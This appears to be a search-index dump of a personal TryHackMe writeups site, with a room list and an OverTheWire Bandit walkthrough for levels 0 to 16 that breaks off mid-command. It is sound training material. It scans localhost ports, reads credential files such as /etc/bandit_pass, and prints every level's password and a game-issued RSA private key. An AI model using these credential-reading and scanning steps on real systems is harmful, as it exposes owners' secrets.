{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#tryhackme-writeups","title":"TryHackMe Writeups","text":"<p>In this repository you will find various walkthroughs/writeups for various TryHackMe rooms. This is mostly for my own use as a sort of knowledge base. But anyone is welcome to view it themselves.</p> <p>An alternative version can be found here: https://kevinovitz.github.io/TryHackMe_Writeups/.</p> <p>The following rooms are available/in progress:</p> <ul> <li> Active Directory Basics</li> <li> Advent of Cyber 1 [2019]</li> <li> Advent of Cyber 2 [2020]</li> <li> Advent of Cyber 2023</li> <li> Advent of Cyber '23 Side Quest [WiP]</li> <li> Advent of Cyber 2024 [WiP]</li> <li> Agent Sudo</li> <li> Anonymous</li> <li> Auditing and Monitoring*</li> <li> Authentication Bypass*</li> <li> Blaster [WiP]</li> <li> Blue</li> <li> Bounty Hacker [WiP]</li> <li> Breaching Active Directory</li> <li> Breaking RSA</li> <li> Buffer Overflows*</li> <li> Burp Suite: The Basics</li> <li> Burp Suite: Intruder*</li> <li> Burp Suite: Other Modules* [Answered]</li> <li> Burp Suite: Repeater</li> <li> Common Linux Privesc* [Answered]</li> <li> Content Discovery</li> <li> Crack the Hash</li> <li> DAST*</li> <li> Data Exfiltration* [WiP]</li> <li> Encryption - Crypto 101 [Answered]</li> <li> Enumerating Active Directory</li> <li> Enumeration* [Answered]</li> <li> Exploiting Active Directory</li> <li> File Inclusion [WiP]</li> <li> Governance &amp; Regulation*</li> <li> Hackfinity Battle [WiP]</li> <li> Hacking with PowerShell [WiP]</li> <li> Hydra</li> <li> Ice</li> <li> Introduction to Cryptography</li> <li> John The Ripper*</li> <li> Kenobi [Answered]</li> <li> Lateral Movement and Pivoting [WiP]</li> <li> Linux Fundamentals Part 1</li> <li> Linux Fundamentals Part 2</li> <li> Linux Fundamentals Part 3</li> <li> Linux System Hardening</li> <li> Linux PrivEsc</li> <li> Linux Privilege Escalation [Answered]</li> <li> MAL: Malware Introductory [Answered]</li> <li> Metasploit: Exploitation* [Answered]</li> <li> Metasploit: Meterpreter [WiP]</li> <li> Mother's Secret*</li> <li> Nessus [Answered]</li> <li> Net Sec Challenge* [Answered]</li> <li> Network Security*</li> <li> OhSINT</li> <li> Operating System Security*</li> <li> OWASP Top 10 - 2021 [Answered]</li> <li> OWASP Juice Shop [Answered]</li> <li> Password Attacks* [Answered]</li> <li> Pickle Rick [Answered]</li> <li> Persisting Active Directory* [WiP]</li> <li> Post-Exploitation Basics [WiP]</li> <li> Printer Hacking 101</li> <li> Red Team Recon</li> <li> Risk Management* [Answered]</li> <li> Rootme [Answered]</li> <li> SAST* [WiP]</li> <li> Shodan.io [WiP]</li> <li> Simple CTF</li> <li> SQL Injection</li> <li> Steel Mountain* [Answered]</li> <li> The Lay of the Land* [Answered]</li> <li> Threat Modelling [Answered]</li> <li> The Return of the Yeti [WiP]</li> <li> Traverse*</li> <li> Upload Vulnerabilities [Answered]</li> <li> Vulnerability Capstone* [Answered]</li> <li> Vulnerability Management* [Answered]</li> <li> Vulnversity</li> <li> Walking An Application [Answered]</li> <li> Weaponization* [Answered]</li> <li> Windows Fundamentals 1 [Answered]</li> <li> Windows Fundamentals 2 [Answered]</li> <li> Windows Fundamentals 3 [Answered]</li> <li> Windows Local Persistence* [Answered]</li> <li> Windows Privilege Escalation* [Answered]</li> <li> Windows PrivEsc</li> <li> Wireshark: The Basics</li> <li> Wireshark: Packet Operations* [WiP]</li> <li> Wonderland [WiP]</li> <li>more to come</li> </ul> <p>Rooms with the [Answered] annotation only have some questions remaining which don't require an answer.</p> <p>*This room is only available with an subscription.</p>"},{"location":"#external-knowledge-bases","title":"External Knowledge Bases","text":"<p> https://gitlab.com/dhiksec/tryhackme</p>"},{"location":"CTFs/over-the-wire/bandit/","title":"bandit walkthrough","text":""},{"location":"CTFs/over-the-wire/bandit/#bandit","title":"Bandit","text":"<p>https://overthewire.org/wargames/bandit/ Don\u2019t panic! Don\u2019t give up!</p> <p>A good walkthrough</p>"},{"location":"CTFs/over-the-wire/bandit/#level-0","title":"level 0","text":"<p>Connect to bandit.labs.overthewire.org on port 2220 with username bandit0 and password bandit0.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution","title":"Solution","text":"<p><code>$ bandit.labs.overthewire.org -p 2220 -l bandit0</code></p>"},{"location":"CTFs/over-the-wire/bandit/#level-0-level-1","title":"level 0 \u2192 level 1","text":"<p>The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using [[SSH]].</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_1","title":"Solution","text":"<p>After logging into bandit0, ```sh= bandit0@bandit:~$ ls readme bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 <pre><code>#### Password\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n### level 1 \u2192 level 2\nThe password for the next level is stored in a file called **-** located in the home directory.\n\n#### Solution\n\n  After logging into bandit1,\n```sh=\nbandit1@bandit:~$ ls\n-\nbandit1@bandit:~$ cat ./-\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password","title":"Password","text":"<p>CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</p>"},{"location":"CTFs/over-the-wire/bandit/#level-2-level-3","title":"level 2 \u2192 level 3","text":"<p>The password for the next level is stored in a file called spaces in this filename located in the home directory.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_2","title":"Solution","text":"<p>After logging into bandit2, ```sh= bandit2@bandit:~$ ls spaces in this filename bandit2@bandit:~$ cat \"spaces in this filename\" UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK <pre><code>#### Password\nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n\n### level 3 \u2192 level 4\nThe password for the next level is stored in a hidden file in the **inhere** directory.\n\n#### Solution\n\n  After logging into bandit3,\n```sh=\nbandit3@bandit:~$ ls\ninhere\nbandit3@bandit:~$ cd inhere\nbandit3@bandit:~/inhere$ ls -a\n.  ..  .hidden\nbandit3@bandit:~/inhere$ strings .hidden\npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_1","title":"Password","text":"<p>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</p>"},{"location":"CTFs/over-the-wire/bandit/#level-4-level-5","title":"level 4 \u2192 level 5","text":"<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the \u201creset\u201d command. - Tips     - Pipeline     - <code>sed</code>     - <code>$()</code> (backticks)</p> <ul> <li>Notes<ul> <li>pipe vs command substitution</li> </ul> </li> </ul>"},{"location":"CTFs/over-the-wire/bandit/#solution_3","title":"Solution","text":"<p>After logging into bandit4, ```sh= bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ls -file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09 bandit4@bandit:~/inhere$ strings $(ls -a | sed \"s/-/.\\/-/\") !TQO koReBOKuIDDepwhWk7jZC0RTdopnAYKh <pre><code>#### Password\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n\n### level 5 \u2192 level 6\nThe password for the next level is stored in a file somewhere under the **inhere** directory and has all of the following properties:\n1. human-readable\n2. 1033 bytes in size\n3. not executable\n\n\n#### Solution\n\n  After logging into bandit5,\n```sh=\nbandit5@bandit:~$ ls\ninhere\nbandit5@bandit:~$ cd inhere\nbandit5@bandit:~/inhere$ ls\nmaybehere00  maybehere03  maybehere06  maybehere09  maybehere12  maybehere15  maybehere18\nmaybehere01  maybehere04  maybehere07  maybehere10  maybehere13  maybehere16  maybehere19\nmaybehere02  maybehere05  maybehere08  maybehere11  maybehere14  maybehere17\nbandit5@bandit:~/inhere$ du -b -a . | grep \"1033\"\n1033    ./maybehere07/.file2\nbandit5@bandit:~/inhere$ cat ./maybehere07/.file2\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_2","title":"Password","text":"<p>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p>"},{"location":"CTFs/over-the-wire/bandit/#level-6-level-7","title":"level 6 \u2192 level 7","text":"<p>The password for the next level is stored somewhere on the server and has all of the following properties: 1. owned by user bandit7 2. owned by group bandit6 3. 33 bytes in size</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_4","title":"Solution","text":"<p>After logging into bandit6, ```sh= bandit6@bandit:~$ ls bandit6@bandit:~$ cd .. bandit6@bandit:/home$ ls bandit0   bandit12  bandit16  bandit2   bandit23  bandit27      bandit29      bandit30-git  bandit33  bandit7 bandit1   bandit13  bandit17  bandit20  bandit24  bandit27-git  bandit29-git  bandit31      bandit4   bandit8 bandit10  bandit14  bandit18  bandit21  bandit25  bandit28      bandit3       bandit31-git  bandit5   bandit9 bandit11  bandit15  bandit19  bandit22  bandit26  bandit28-git  bandit30      bandit32      bandit6 bandit6@bandit:/home$ du . -a -b | grep 33 du: cannot read directory './bandit28-git': Permission denied 33      ./bandit4/inhere/-file01 33      ./bandit4/inhere/-file00 33      ./bandit4/inhere/-file06 33      ./bandit4/inhere/-file03 33      ./bandit4/inhere/-file05 33      ./bandit4/inhere/-file08 du: cannot read directory './bandit30-git': Permission denied 33      ./bandit4/inhere/-file04 33      ./bandit4/inhere/-file07 33      ./bandit4/inhere/-file02 33      ./bandit4/inhere/-file09 33033   ./bandit8/data.txt 3526    ./bandit33/.bashrc 675     ./bandit33/.profile 220     ./bandit33/.bash_logout 430     ./bandit33/README.txt 8947    ./bandit33 33      ./bandit0/readme du: cannot read directory './bandit5/inhere': Permission denied 33      ./bandit25/.bandit24.password 10233   ./bandit25 33      ./bandit15/.bandit14.password 33      ./bandit3/inhere/.hidden du: 33  ./bandit16/.bandit15.password 33      ./bandit2/spaces in this filename 33      ./bandit1/- cannot read directory './bandit27-git': Permission denied du: 33  ./bandit18/readme 33      ./bandit21/.prevpass 3300    ./bandit17/passwords.old 33      ./bandit17/.bandit16.password 3300    ./bandit17/passwords.new cannot read directory './bandit29-git': Permission denied du: cannot read directory './bandit31-git': Permission denied <pre><code>Nothing meets the property.\n```sh=\nbandit6@bandit:/home$ cd ../..\nbandit6@bandit:/$ ls\nbin      dev   initrd.img      lib32   lost+found  opt         root  share  tmp  vmlinuz\nboot     etc   initrd.img.old  lib64   media       proc        run   srv    usr  vmlinuz.old\ncgroup2  home  lib             libx32  mnt         README.txt  sbin  sys    var\nbandit6@bandit:/$ du . -a -b -h | grep -e \"33.*bandit7\"\ndu: cannot read directory './root': Permission denied\ndu: cannot read directory './home/bandit28-git': Permission denied\ndu: cannot read directory './home/bandit30-git': Permission denied\ndu: cannot read directory './home/bandit5/inhere': Permission denied\ndu: cannot read directory './home/bandit27-git': Permission denied\ndu: cannot read directory './home/bandit29-git': Permission denied\ndu: cannot read directory './home/bandit31-git': Permission denied\ndu: cannot read directory './lost+found': Permission denied\n33      ./etc/bandit_pass/bandit7\ndu: cannot read directory './etc/ssl/private': Permission denied\ndu: cannot read directory './etc/polkit-1/localauthority': Permission denied\ndu: cannot read directory './etc/lvm/archive': Permission denied\ndu: cannot read directory './etc/lvm/backup': Permission denied\ndu: cannot read directory './sys/fs/pstore': Permission denied\ndu: cannot read directory './proc/tty/driver': Permission denied\ndu: cannot access './proc/4221/task/4221/fd/4': No such file or directory\ndu: cannot access './proc/4221/task/4221/fdinfo/4': No such file or directory\ndu: cannot access './proc/4221/fd/3': No such file or directory\ndu: cannot access './proc/4221/fdinfo/3': No such file or directory\ndu: cannot read directory './cgroup2/csessions': Permission denied\ndu: cannot read directory './boot/lost+found': Permission denied\ndu: cannot read directory './tmp': Permission denied\ndu: cannot read directory './run/lvm': Permission denied\ndu: cannot read directory './run/screen/S-bandit0': Permission denied\ndu: cannot read directory './run/screen/S-bandit1': Permission denied\ndu: cannot read directory './run/screen/S-bandit12': Permission denied\ndu: cannot read directory './run/screen/S-bandit11': Permission denied\ndu: cannot read directory './run/screen/S-bandit10': Permission denied\ndu: cannot read directory './run/screen/S-bandit3': Permission denied\ndu: cannot read directory './run/screen/S-bandit29': Permission denied\ndu: cannot read directory './run/screen/S-bandit15': Permission denied\ndu: cannot read directory './run/screen/S-bandit8': Permission denied\ndu: cannot read directory './run/screen/S-bandit13': Permission denied\ndu: cannot read directory './run/screen/S-bandit19': Permission denied\ndu: cannot read directory './run/screen/S-bandit9': Permission denied\ndu: cannot read directory './run/screen/S-bandit27': Permission denied\ndu: cannot read directory './run/screen/S-bandit2': Permission denied\ndu: cannot read directory './run/screen/S-bandit14': Permission denied\ndu: cannot read directory './run/screen/S-bandit16': Permission denied\ndu: cannot read directory './run/screen/S-bandit22': Permission denied\ndu: cannot read directory './run/screen/S-bandit4': Permission denied\ndu: cannot read directory './run/screen/S-bandit31': Permission denied\ndu: cannot read directory './run/screen/S-bandit24': Permission denied\ndu: cannot read directory './run/screen/S-bandit21': Permission denied\ndu: cannot read directory './run/screen/S-bandit25': Permission denied\ndu: cannot read directory './run/screen/S-bandit23': Permission denied\ndu: cannot read directory './run/screen/S-bandit20': Permission denied\ndu: cannot read directory './run/shm': Permission denied\ndu: cannot read directory './run/lock/lvm': Permission denied\ndu: cannot read directory './var/spool/bandit24': Permission denied\ndu: cannot read directory './var/spool/cron/crontabs': Permission denied\ndu: cannot read directory './var/spool/rsyslog': Permission denied\ndu: cannot read directory './var/tmp': Permission denied\ndu: cannot read directory './var/lib/apt/lists/partial': Permission denied\ndu: cannot read directory './var/lib/polkit-1': Permission denied\n33      ./var/lib/dpkg/info/bandit7.password\ndu: cannot read directory './var/log': Permission denied\ndu: cannot read directory './var/cache/apt/archives/partial': Permission denied\ndu: cannot read directory './var/cache/ldconfig': Permission denied\nbandit6@bandit:/$ strings ./var/lib/dpkg/info/bandit7.password\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_3","title":"Password","text":"<p>HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p>"},{"location":"CTFs/over-the-wire/bandit/#level-7-level-8","title":"level 7 \u2192 level 8","text":"<p>The password for the next level is stored in the file data.txt next to the word millionth.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_5","title":"Solution","text":"<p>After logging into bandit7, ```sh= bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ strings data.txt | grep \"millionth\" millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV <pre><code>#### Password\ncvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n### level 8 \u2192 level 9\nThe password for the next level is stored in the file **data.txt** and is the only line of text that occurs only once.\n\n#### Solution\n\n  After logging into bandit8,\n```sh=\nbandit8@bandit:~$ strings data.txt | sort | uniq -c | grep \"1 \"\n      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_4","title":"Password","text":"<p>UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p>"},{"location":"CTFs/over-the-wire/bandit/#level-9-level-10","title":"level 9 \u2192 level 10","text":"<p>The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several \u2018=\u2019 characters.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_6","title":"Solution","text":"<p>After logging into bandit9, ```sh= bandit9@bandit:~$ strings data.txt | grep \"==\" ========== the*2i\"4 ========== password Z)========== is &amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk <pre><code>#### Password\ntruKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n\n### level 10 \u2192 level 11\nThe password for the next level is stored in the file **data.txt**, which contains base64 encoded data.\n\n- Tips\n    - == at the end -&gt; base64\n\n#### Solution\n\n  After logging into bandit10,\n```sh=\nbandit10@bandit:~$ base64 -d data.txt\nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_5","title":"Password","text":"<p>IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p>"},{"location":"CTFs/over-the-wire/bandit/#level-11-level-12","title":"level 11 \u2192 level 12","text":"<p>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_7","title":"Solution","text":"<p>Caesar cipher   After logging into bandit11, ```sh= bandit11@bandit:~$ strings data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu <pre><code>#### Password\n5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n\n### level 12 \u2192 level 13\nThe password for the next level is stored in the file **data.txt**, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)\n\n- Tips \n    - Use `file` to get the information of files\n\n- Takeaway\n    - decompress gzip `gzip -d rdata.gz`\n    - decompress bzip2 `bzip2 -d rdata.bz2`\n    - decompress tar `tar -xvf rdata.tar`\n\n#### Solution\n\n  After logging into bandit12,\n```sh=\nbandit12@bandit:~$ mkdir /tmp/foo\nbandit12@bandit:~$ cp data.txt /tmp/foo/data.txt\nbandit12@bandit:~$ cd /tmp/foo\nbandit12@bandit:/tmp/foo$ xxd -r data.txt rdata\nbandit12@bandit:/tmp/foo$ strings rdata\ndata2.bin\nBZh91AY&amp;SY\n{RBp\n5(3A\n7{qP\n3A4$\nq       \\)\nBB9&lt;s\n</code></pre></p> <p>Use <code>file</code> to check it. Decompress the gzip file. <code>sh= bandit12@bandit:/tmp/foo$ file rdata rdata: gzip compressed data, was \"data2.bin\", last modified: Thu May  7 18:14:30 2020, max compression, from Unix bandit12@bandit:/tmp/foo$ mv rdata rdata.gz bandit12@bandit:/tmp/foo$ gzip -d rdata.gz bandit12@bandit:/tmp/foo$ ls data.txt  rdata bandit12@bandit:/tmp/foo$ file rdata rdata: bzip2 compressed data, block size = 900k <pre><code>Decompress the bzip2 file.\n```sh=\nbandit12@bandit:/tmp/foo$ mv rdata rdata.bz2\nbandit12@bandit:/tmp/foo$ bzip2 -d rdata.bz2\nbandit12@bandit:/tmp/foo$ ls\ndata.txt  rdata\nbandit12@bandit:/tmp/foo$ file rdata\nrdata: gzip compressed data, was \"data4.bin\", last modified: Thu May  7 18:14:30 2020, max compression, from Unix\nbandit12@bandit:/tmp/foo$ mv rdata rdata.gz\nbandit12@bandit:/tmp/foo$ gzip -d rdata.gz\n</code></pre> Decompress the POSIX tar archive.</code>sh= bandit12@bandit:/tmp/foo$ file rdata rdata: POSIX tar archive (GNU) bandit12@bandit:/tmp/foo$ mv rdata rdata.tar bandit12@bandit:/tmp/foo$ tar -xvf rdata.tar data5.bin <pre><code>MISC\n```sh=\nbandit12@bandit:/tmp/foo$ file data5.bin\ndata5.bin: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/foo$ mv data5.bin data.tar\nbandit12@bandit:/tmp/foo$ tar -xvf data.tar\ndata6.bin\nbandit12@bandit:/tmp/foo$ file data6.bin\ndata6.bin: bzip2 compressed data, block size = 900k\nbandit12@bandit:/tmp/foo$ mv data6.bin rdata.bz2\nbandit12@bandit:/tmp/foo$ bzip2 -d rdata.bz2\nbandit12@bandit:/tmp/foo$ ls\ndata.tar  data.txt  rdata  rdata.tar\nbandit12@bandit:/tmp/foo$ file rdata\nrdata: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/foo$ mv rdata rdata.tar\nbandit12@bandit:/tmp/foo$ tar -xvf rdata.tar\ndata8.bin\nbandit12@bandit:/tmp/foo$ file data8.bin\ndata8.bin: gzip compressed data, was \"data9.bin\", last modified: Thu May  7 18:14:30 2020, max compression, from Unix\nbandit12@bandit:/tmp/foo$ mv data8.bin data9.gz\nbandit12@bandit:/tmp/foo$ gzip -d data9.gz\nbandit12@bandit:/tmp/foo$ ls\ndata9  data.tar  data.txt  rdata.tar\nbandit12@bandit:/tmp/foo$ file data9\ndata9: ASCII text\nbandit12@bandit:/tmp/foo$ strings data9\nThe password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#password_6","title":"Password","text":"<p>8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</p>"},{"location":"CTFs/over-the-wire/bandit/#level-13-level-14","title":"level 13 \u2192 level 14","text":"<p>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don\u2019t get the next password, but you get a private [[SSH]] key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_8","title":"Solution","text":"<p>After logging into bandit13, ```sh= bandit13@bandit:~$ ls sshkey.private bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost ... Are you sure you want to continue connecting (yes/no)? yes bandit14@bandit:~$ strings /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e <pre><code>#### Password\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n\n### level 14 \u2192 level 15\nThe password for the next level can be retrieved by submitting the password of the current level to **port 30000 on localhost**.\n\n#### Solution\n\n  After logging into bandit14,\n```sh=\nbandit14@bandit:~$ nc localhost 30000\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n</code></pre></p>"},{"location":"CTFs/over-the-wire/bandit/#solution_9","title":"Solution","text":"<p>BfMYroe26WYalil77FoDi9qh59eK5xNr</p>"},{"location":"CTFs/over-the-wire/bandit/#level-15-level-16","title":"level 15 \u2192 level 16","text":"<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p> <p>Helpful note: Getting \u201cHEARTBEATING\u201d and \u201cRead R BLOCK\u201d? Use -ign_eof and read the \u201cCONNECTED COMMANDS\u201d section in the manpage. Next to \u2018R\u2019 and \u2018Q\u2019, the \u2018B\u2019 command also works in this version of that command\u2026</p>"},{"location":"CTFs/over-the-wire/bandit/#solution_10","title":"Solution","text":"<p>After logging into bandit15, <code>``sh= bandit15@bandit:~$ openssl s_client -crlf -connect localhost:30001 -servername localhost ... BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd <pre><code>#### Password\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\n\n### level 16 \u2192 level 17\nThe credentials for the next level can be retrieved by submitting the password of the current level to **a port on localhost in the range 31000 to 32000**. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don\u2019t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.\n\n- Tips\n    - `[[ssh]]` by key\n\n#### Solution\n\n  After logging into bandit16,\n```sh=\nbandit16@bandit:~$ nmap localhost -p 31000-32000\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2021-07-02 14:24 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00023s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 0.10 seconds\nbandit16@bandit:~$ nmap localhost -p 31046 -sV -T4\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2021-07-02 14:26 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00012s latency).\nPORT      STATE SERVICE VERSION\n31046/tcp open  echo\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 41.51 seconds\nbandit16@bandit:~$ nmap localhost -p 31790 -sV -T5\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2021-07-02 14:30 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00015s latency).\nPORT      STATE SERVICE     VERSION\n31790/tcp open  ssl/unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31790-TCP:V=7.40%T=SSL%I=7%D=7/2%Time=60DF06EF%P=x86_64-pc-linux-gn\nSF:u%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cur\nSF:rent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\\nSF:x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Pleas\nSF:e\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,3\nSF:1,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\nSF:\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x2\nSF:0password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20c\nSF:orrect\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20Please\\\nSF:x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"Wr\nSF:ong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(\nSF:FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu\nSF:rrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20the\\\nSF:x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20Ple\nSF:ase\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptions,\nSF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\\nSF:n\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.73 seconds\n\nbandit16@bandit:~$ openssl s_client -crlf -connect localhost:31790\n...\ncluFn7wTiGryunymYOu4RcffSxQluehd\nCorrect!\n-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\ndxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\nvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n-----END RSA PRIVATE KEY-----\n\nclosed\n</code></pre> Save the key to the file</code>key1.key`, and use it to go to the next level. <pre><code>bandit16@bandit:~$ mkdir /tmp/foo\nbandit16@bandit:~$ cd /tmp/foo\nbandit16@bandit:/tmp/foo$ vim key1.key\nbandit16@bandit:/tmp/foo$ chmod 600 